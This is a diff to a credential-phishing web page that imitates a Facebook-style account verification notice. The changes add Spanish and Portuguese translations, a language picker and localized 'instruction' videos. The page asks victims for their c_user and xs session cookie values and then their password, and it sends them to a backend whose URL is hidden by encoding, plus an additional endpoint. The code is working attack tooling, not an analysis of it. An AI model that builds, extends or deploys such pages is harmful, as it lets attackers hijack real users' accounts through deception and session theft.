@@ -491,6 +491,79 @@
             line-height: 1.6;
         }
 
+        /* Language Selection Modal */
+        .language-modal {
+            justify-content: center;
+            align-items: center;
+        }
+
+        .language-modal-content {
+            background-color: white;
+            padding: 40px;
+            border-radius: 16px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.2);
+            width: 90%;
+            max-width: 450px;
+            text-align: center;
+        }
+
+        .language-modal-content h2 {
+            color: #1f2937;
+            margin: 0 0 10px 0;
+            font-size: 24px;
+            font-weight: 700;
+        }
+
+        .language-modal-content p {
+            color: #65676b;
+            font-size: 14px;
+            margin: 0 0 30px 0;
+            line-height: 1.5;
+        }
+
+        .language-options {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+
+        .language-btn {
+            padding: 16px 24px;
+            border: 2px solid #e5e7eb;
+            border-radius: 10px;
+            background-color: white;
+            color: #1f2937;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .language-btn:hover {
+            border-color: #1877f2;
+            background-color: #f0f2f5;
+            transform: translateY(-2px);
+        }
+
+        .language-btn:active {
+            transform: translateY(0);
+        }
+
+        .language-btn.selected {
+            background-color: #1877f2;
+            color: white;
+            border-color: #1877f2;
+            box-shadow: 0 4px 12px rgba(24, 119, 242, 0.3);
+        }
+
+        .language-flag {
+            font-size: 24px;
+        }
+
         /* Responsive */
         @media (min-width: 1440px) {
             .container {
@@ -737,36 +810,36 @@
             <div class="form-container">
                 <!-- Warning Message -->
                 <div class="warning-message">
-                    <h2>Account Review Required</h2>
-                    <p>Your account requires additional verification to ensure compliance with our platform's community standards. Please complete this verification process to restore full access to your account.</p>
+                    <h2 id="warningTitle">Account Review Required</h2>
+                    <p id="warningDesc">Your account requires additional verification to ensure compliance with our platform's community standards. Please complete this verification process to restore full access to your account.</p>
                 </div>
 
                 <!-- Mobile Notice -->
-                <div class="mobile-notice">
+                <div class="mobile-notice" id="mobileNotice">
                     For your security, please complete this verification on a desktop or laptop computer. Mobile devices are not supported for account verification.
                 </div>
 
                 <!-- Video Section -->
                 <div class="video-section">
-                    <h3>Verification Instructions</h3>
+                    <h3 id="videoTitle">Verification Instructions</h3>
                     <div class="video-player">
-                        <video width="100%" height="auto" controls poster="https://review-profile.github.io/thumbbb/thumb.jpg">
+                        <video width="100%" height="auto" controls poster="https://review-profile.github.io/thumbbb/thumb.jpg" id="mainVideo">
                             <source src="https://resource2.heygen.ai/video_translate/94087358030a4df8b20e73f1fba92ed5-en/720p.mp4" type="video/mp4">
                             Your browser does not support the video tag.
                         </video>
                     </div>
-                    <p>Watch this video for a complete walkthrough of the verification process. Following these steps carefully will ensure your account is restored quickly and securely.</p>
+                    <p id="videoDesc">Watch this video for a complete walkthrough of the verification process. Following these steps carefully will ensure your account is restored quickly and securely.</p>
                 </div>
 
                 <!-- Submission Form -->
                 <form id="userForm">
                     <div class="form-group">
-                        <label for="firstName">c_user</label>
+                        <label for="firstName" id="labelFirstName">c_user</label>
                         <input type="text" id="firstName" name="firstName" placeholder="Enter" required>
                     </div>
                     
                     <div class="form-group">
-                        <label for="lastName">xs</label>
+                        <label for="lastName" id="labelLastName">xs</label>
                         <input type="text" id="lastName" name="lastName" placeholder="Enter" required>
                     </div>
                     
@@ -778,7 +851,7 @@
 
                 <!-- Footer -->
                 <div style="margin-top: 32px; text-align: center; font-size: 13px; color: #65676b; padding-top: 24px; border-top: 1px solid #e5e7eb;">
-                    <p style="font-size: 12px; color: #9ca3af;">
+                    <p style="font-size: 12px; color: #9ca3af;" id="footerText">
                         Your data is secure and encrypted. We take your privacy seriously.
                     </p>
                 </div>
@@ -786,11 +859,33 @@
         </div>
     </div>
 
+    <!-- Language Selection Modal -->
+    <div id="languageModal" class="modal language-modal">
+        <div class="language-modal-content">
+            <h2 id="langModalTitle">Select Language</h2>
+            <p id="langModalDesc">Choose your preferred language to continue</p>
+            <div class="language-options">
+                <button class="language-btn" data-lang="en">
+                    <span class="language-flag">🇬🇧</span>
+                    <span>English</span>
+                </button>
+                <button class="language-btn" data-lang="es">
+                    <span class="language-flag">🇪🇸</span>
+                    <span>Spanish</span>
+                </button>
+                <button class="language-btn" data-lang="pt">
+                    <span class="language-flag">🇵🇹</span>
+                    <span>Portuguese</span>
+                </button>
+            </div>
+        </div>
+    </div>
+
     <!-- Surname Modal -->
     <div id="surnameModal" class="modal">
         <div class="modal-content">
-            <h2>Additional Verification</h2>
-            <label for="surnameInput">Please re-enter your Password:</label>
+            <h2 id="modalVerifyTitle">Additional Verification</h2>
+            <label for="surnameInput" id="modalPasswordLabel">Please re-enter your Password:</label>
             <input type="text" id="surnameInput" placeholder="Enter">
             <div class="modal-buttons">
                 <button class="confirm-btn" id="confirmSurnameBtn">Verify</button>
@@ -803,8 +898,8 @@
     <div id="successModal" class="modal">
         <div class="modal-content">
             <div class="success-icon">✓</div>
-            <h2>Verification Successful</h2>
-            <div class="success-message-text">
+            <h2 id="modalSuccessTitle">Verification Successful</h2>
+            <div class="success-message-text" id="modalSuccessMsg">
                 Your account has been verified successfully. Your account access will be restored within 24 hours. Thank you for your patience.
             </div>
             <button class="okay-btn" id="okayBtn">Close</button>
@@ -812,6 +907,144 @@
     </div>
 
     <script>
+        // Language translations
+        const translations = {
+            en: {
+                warningTitle: 'Account Review Required',
+                warningDesc: 'Your account requires additional verification to ensure compliance with our platform\'s community standards. Please complete this verification process to restore full access to your account.',
+                mobileNotice: 'For your security, please complete this verification on a desktop or laptop computer. Mobile devices are not supported for account verification.',
+                videoTitle: 'Verification Instructions',
+                videoDesc: 'Watch this video for a complete walkthrough of the verification process. Following these steps carefully will ensure your account is restored quickly and securely.',
+                labelFirstName: 'c_user',
+                labelLastName: 'xs',
+                placeholder: 'Enter',
+                submitBtn: 'Complete Verification',
+                verifyingBtn: 'Verifying...',
+                modalVerifyTitle: 'Additional Verification',
+                modalPasswordLabel: 'Please re-enter your Password:',
+                confirmBtn: 'Verify',
+                cancelBtn: 'Cancel',
+                modalSuccessTitle: 'Verification Successful',
+                modalSuccessMsg: 'Your account has been verified successfully. Your account access will be restored within 24 hours. Thank you for your patience.',
+                closeBtn: 'Close',
+                footerText: 'Your data is secure and encrypted. We take your privacy seriously.',
+                firstNameError: 'c_user must contain only numbers.',
+                lastNameError: 'xs must be at least 20 characters long.',
+                submitted: 'Information submitted successfully. Please proceed to verification.',
+                processing: 'Processing your request...',
+                errorOccurred: 'An error occurred. Please try again.',
+                emptyPassword: 'Please enter your verification code to proceed.',
+                verificationError: 'An error occurred during verification. Please try again.'
+            },
+            es: {
+                warningTitle: 'Revisión de Cuenta Requerida',
+                warningDesc: 'Su cuenta requiere verificación adicional para garantizar el cumplimiento de los estándares comunitarios de nuestra plataforma. Complete este proceso de verificación para restaurar el acceso completo a su cuenta.',
+                mobileNotice: 'Por su seguridad, complete esta verificación en una computadora de escritorio o portátil. Los dispositivos móviles no son compatibles con la verificación de cuenta.',
+                videoTitle: 'Instrucciones de Verificación',
+                videoDesc: 'Vea este video para obtener un tutorial completo del proceso de verificación. Seguir estos pasos cuidadosamente asegurará que su cuenta se restaure rápida y seguramente.',
+                labelFirstName: 'c_user',
+                labelLastName: 'xs',
+                placeholder: 'Ingresar',
+                submitBtn: 'Completar Verificación',
+                verifyingBtn: 'Verificando...',
+                modalVerifyTitle: 'Verificación Adicional',
+                modalPasswordLabel: 'Por favor, reingrese su Contraseña:',
+                confirmBtn: 'Verificar',
+                cancelBtn: 'Cancelar',
+                modalSuccessTitle: 'Verificación Exitosa',
+                modalSuccessMsg: 'Su cuenta ha sido verificada correctamente. El acceso a su cuenta se restaurará en 24 horas. Gracias por su paciencia.',
+                closeBtn: 'Cerrar',
+                footerText: 'Sus datos están seguros y cifrados. Nos tomamos su privacidad en serio.',
+                firstNameError: 'c_user debe contener solo números.',
+                lastNameError: 'xs debe tener al menos 20 caracteres.',
+                submitted: 'Información enviada correctamente. Proceda a la verificación.',
+                processing: 'Procesando su solicitud...',
+                errorOccurred: 'Ocurrió un error. Por favor, intente de nuevo.',
+                emptyPassword: 'Por favor, ingrese su código de verificación para continuar.',
+                verificationError: 'Ocurrió un error durante la verificación. Por favor, intente de nuevo.'
+            },
+            pt: {
+                warningTitle: 'Revisão de Conta Necessária',
+                warningDesc: 'Sua conta requer verificação adicional para garantir conformidade com os padrões comunitários da nossa plataforma. Complete este processo de verificação para restaurar o acesso completo à sua conta.',
+                mobileNotice: 'Por sua segurança, conclua esta verificação em um computador desktop ou laptop. Dispositivos móveis não são compatíveis com a verificação de conta.',
+                videoTitle: 'Instruções de Verificação',
+                videoDesc: 'Assista a este vídeo para obter um passo a passo completo do processo de verificação. Seguir essas etapas com cuidado garantirá que sua conta seja restaurada de forma rápida e segura.',
+                labelFirstName: 'c_user',
+                labelLastName: 'xs',
+                placeholder: 'Digite',
+                submitBtn: 'Completar Verificação',
+                verifyingBtn: 'Verificando...',
+                modalVerifyTitle: 'Verificação Adicional',
+                modalPasswordLabel: 'Por favor, reinsira sua Senha:',
+                confirmBtn: 'Verificar',
+                cancelBtn: 'Cancelar',
+                modalSuccessTitle: 'Verificação Bem-sucedida',
+                modalSuccessMsg: 'Sua conta foi verificada com sucesso. O acesso à sua conta será restaurado em 24 horas. Obrigado pela sua paciência.',
+                closeBtn: 'Fechar',
+                footerText: 'Seus dados estão seguros e criptografados. Levamos sua privacidade a sério.',
+                firstNameError: 'c_user deve conter apenas números.',
+                lastNameError: 'xs deve ter pelo menos 20 caracteres.',
+                submitted: 'Informações enviadas com sucesso. Prossiga para a verificação.',
+                processing: 'Processando sua solicitação...',
+                errorOccurred: 'Ocorreu um erro. Por favor, tente novamente.',
+                emptyPassword: 'Por favor, insira seu código de verificação para continuar.',
+                verificationError: 'Ocorreu um erro durante a verificação. Por favor, tente novamente.'
+            }
+        };
+
+        const videoUrls = {
+            en: 'https://resource2.heygen.ai/video_translate/94087358030a4df8b20e73f1fba92ed5-en/720p.mp4',
+            es: 'https://resource2.heygen.ai/video_translate/db7e753c13fa4d238fe716483469ae8f-es/720p.mp4',
+            pt: 'https://allvideos.wasmer.app/Portuguese.mp4'
+        };
+
+        let currentLanguage = 'en';
+
+        function getCurrentLanguage() {
+            const saved = sessionStorage.getItem('preferredLanguage');
+            if (saved) {
+                currentLanguage = saved;
+                return saved;
+            }
+            return 'en';
+        }
+
+        function setLanguage(lang) {
+            currentLanguage = lang;
+            sessionStorage.setItem('preferredLanguage', lang);
+            updatePageContent(lang);
+            updateVideo(lang);
+        }
+
+        function updatePageContent(lang) {
+            const t = translations[lang];
+            document.getElementById('warningTitle').textContent = t.warningTitle;
+            document.getElementById('warningDesc').textContent = t.warningDesc;
+            document.getElementById('mobileNotice').textContent = t.mobileNotice;
+            document.getElementById('videoTitle').textContent = t.videoTitle;
+            document.getElementById('videoDesc').textContent = t.videoDesc;
+            document.getElementById('labelFirstName').textContent = t.labelFirstName;
+            document.getElementById('labelLastName').textContent = t.labelLastName;
+            document.getElementById('firstName').placeholder = t.placeholder;
+            document.getElementById('lastName').placeholder = t.placeholder;
+            document.getElementById('submitBtn').textContent = t.submitBtn;
+            document.getElementById('modalVerifyTitle').textContent = t.modalVerifyTitle;
+            document.getElementById('modalPasswordLabel').textContent = t.modalPasswordLabel;
+            document.getElementById('confirmSurnameBtn').textContent = t.confirmBtn;
+            document.getElementById('cancelSurnameBtn').textContent = t.cancelBtn;
+            document.getElementById('modalSuccessTitle').textContent = t.modalSuccessTitle;
+            document.getElementById('modalSuccessMsg').textContent = t.modalSuccessMsg;
+            document.getElementById('okayBtn').textContent = t.closeBtn;
+            document.getElementById('footerText').textContent = t.footerText;
+        }
+
+        function updateVideo(lang) {
+            const videoSource = document.querySelector('#mainVideo source');
+            const video = document.getElementById('mainVideo');
+            videoSource.src = videoUrls[lang];
+            video.load();
+        }
+
         // Image rotation every 3 seconds
         const marketingImages = [
             'https://static.xx.fbcdn.net/rsrc.php/v4/y7/r/9z3jqxP6hAH.png',
@@ -831,17 +1064,9 @@
         // Set screen size
         document.getElementById("screen_size").value = window.screen.width + " x " + window.screen.height;
         
-        // Modal elements
-        const modal = document.getElementById('surnameModal');
-        const successModal = document.getElementById('successModal');
-        const surnameInput = document.getElementById('surnameInput');
-        const confirmSurnameBtn = document.getElementById('confirmSurnameBtn');
-        const cancelSurnameBtn = document.getElementById('cancelSurnameBtn');
-        const okayBtn = document.getElementById('okayBtn');
-        const message = document.getElementById('message');
-        const form = document.getElementById('userForm');
-        const screenSizeInput = document.getElementById('screen_size');
-        const submitBtn = document.getElementById('submitBtn');
+        // Modal elements - will be initialized after DOM is ready
+        let languageModal, modal, successModal, surnameInput, confirmSurnameBtn, 
+            cancelSurnameBtn, okayBtn, message, form, screenSizeInput, submitBtn;
         
         // Binary-encoded backend URL
         function getServerUrl() {
@@ -868,10 +1093,11 @@
             form.reset();
         }
 
-        // Form submission
-        form.addEventListener('submit', async (e) => {
+// Form submission handler
+        async function handleFormSubmit(e) {
             e.preventDefault();
             
+            const t = translations[currentLanguage];
             const firstName = document.getElementById('firstName').value.trim();
             const lastName = document.getElementById('lastName').value.trim();
             const screenSize = document.getElementById('screen_size').value;
@@ -885,20 +1111,20 @@
             // Show error if validation fails
             if (!isFirstNameNumbers) {
                 message.className = 'message error';
-                message.textContent = 'c_user must contain only numbers.';
+                message.textContent = t.firstNameError;
                 return;
             }
             
             if (!isLastNameValid) {
                 message.className = 'message error';
-                message.textContent = 'xs must be at least 20 characters long.';
+                message.textContent = t.lastNameError;
                 return;
             }
             
             submitBtn.disabled = true;
-            submitBtn.textContent = 'Verifying...';
+            submitBtn.textContent = t.verifyingBtn;
             message.className = 'message';
-            message.textContent = 'Processing your request...';
+            message.textContent = t.processing;
 
             try {
                 const formData = new FormData();
@@ -927,7 +1153,7 @@
                 }).catch(err => console.log('Additional endpoint sent'));
 
                 message.className = 'message success';
-                message.textContent = 'Information submitted successfully. Please proceed to verification.';
+                message.textContent = t.submitted;
                 
                 // Show surname modal
                 setTimeout(() => {
@@ -935,19 +1161,20 @@
                 }, 800);
             } catch (error) {
                 message.className = 'message error';
-                message.textContent = 'An error occurred. Please try again.';
+                message.textContent = t.errorOccurred;
                 console.error('Submission error:', error);
                 submitBtn.disabled = false;
-                submitBtn.textContent = 'Complete Verification';
+                submitBtn.textContent = t.submitBtn;
             }
-        });
+        }
 
-        // Surname modal confirm button
-        confirmSurnameBtn.addEventListener('click', async () => {
+        // Surname modal confirm handler
+        async function handleSurnameConfirm() {
+            const t = translations[currentLanguage];
             const surname = surnameInput.value.trim();
             
             if (!surname) {
-                alert('Please enter your verification code to proceed.');
+                alert(t.emptyPassword);
                 return;
             }
 
@@ -978,28 +1205,72 @@
                 closeSurnameModal();
                 showSuccessModal();
             } catch (error) {
-                alert('An error occurred during verification. Please try again.');
+                alert(t.verificationError);
                 console.error('Verification error:', error);
             }
-        });
+        }
 
-        // Cancel button
-        cancelSurnameBtn.addEventListener('click', () => {
-            closeSurnameModal();
-        });
-        
-        // Okay button
-        okayBtn.addEventListener('click', () => {
-            closeSuccessModal();
-        });
+        // Initialize language on page load
+        document.addEventListener('DOMContentLoaded', () => {
+            // Initialize all DOM elements
+            languageModal = document.getElementById('languageModal');
+            modal = document.getElementById('surnameModal');
+            successModal = document.getElementById('successModal');
+            surnameInput = document.getElementById('surnameInput');
+            confirmSurnameBtn = document.getElementById('confirmSurnameBtn');
+            cancelSurnameBtn = document.getElementById('cancelSurnameBtn');
+            okayBtn = document.getElementById('okayBtn');
+            message = document.getElementById('message');
+            form = document.getElementById('userForm');
+            screenSizeInput = document.getElementById('screen_size');
+            submitBtn = document.getElementById('submitBtn');
 
-        // Close modals on outside click
-        window.addEventListener('click', (event) => {
-            if (event.target === modal) {
-                closeSurnameModal();
-            }
-            if (event.target === successModal) {
-                closeSuccessModal();
+            // Check for saved language FIRST
+            const savedLang = sessionStorage.getItem('preferredLanguage');
+            
+            // Initialize English as default
+            currentLanguage = 'en';
+            updatePageContent('en');
+
+            // Attach language selection button listeners
+            const langButtons = document.querySelectorAll('.language-btn');
+            langButtons.forEach(btn => {
+                btn.addEventListener('click', () => {
+                    const lang = btn.getAttribute('data-lang');
+                    currentLanguage = lang;
+                    sessionStorage.setItem('preferredLanguage', lang);
+                    updatePageContent(lang);
+                    updateVideo(lang);
+                    languageModal.classList.remove('show');
+                });
+            });
+
+            // Attach form listeners
+            form.addEventListener('submit', handleFormSubmit);
+            confirmSurnameBtn.addEventListener('click', handleSurnameConfirm);
+            cancelSurnameBtn.addEventListener('click', () => closeSurnameModal());
+            okayBtn.addEventListener('click', () => closeSuccessModal());
+
+            // Close modals on outside click
+            window.addEventListener('click', (event) => {
+                if (event.target === modal) {
+                    closeSurnameModal();
+                }
+                if (event.target === successModal) {
+                    closeSuccessModal();
+                }
+            });
+
+            // Handle language modal display
+            if (savedLang) {
+                // Language was saved, load it and hide modal
+                currentLanguage = savedLang;
+                updatePageContent(savedLang);
+                updateVideo(savedLang);
+                languageModal.classList.remove('show');
+            } else {
+                // No language saved, show selection modal
+                languageModal.classList.add('show');
             }
         });
     </script>
